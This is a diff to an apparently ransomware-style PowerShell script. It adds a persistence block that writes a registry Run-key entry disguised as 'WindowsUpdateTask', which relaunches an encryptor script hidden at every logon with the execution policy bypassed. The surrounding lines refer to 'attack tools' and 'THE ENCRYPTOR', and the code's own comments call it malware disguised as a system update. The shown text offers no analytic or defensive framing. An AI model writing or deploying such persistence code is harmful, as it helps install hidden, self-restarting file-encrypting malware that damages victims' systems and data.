@@ -1,3 +1,17 @@
+# --- NEW: PERSISTENCE MECHANISM ---
+Write-Host "[*] Establishing persistence..." -ForegroundColor Gray
+
+# Disguising the malware as a system update task in the Registry
+$RegistryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$PayloadPath = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PWD\encrypt.ps1`""
+
+try {
+    New-ItemProperty -Path $RegistryPath -Name "WindowsUpdateTask" -Value $PayloadPath -PropertyType String -Force | Out-Null
+    Write-Host "[+] Persistence established: HKCU\...\Run\WindowsUpdateTask" -ForegroundColor Cyan
+} catch {
+    Write-Host "[-] Failed to set persistence." -ForegroundColor Red
+}
+
 Write-Host "[*] Provisioning attack tools..." -ForegroundColor Gray
 
 # --- 1. THE ENCRYPTOR (File-Only Mode) ---
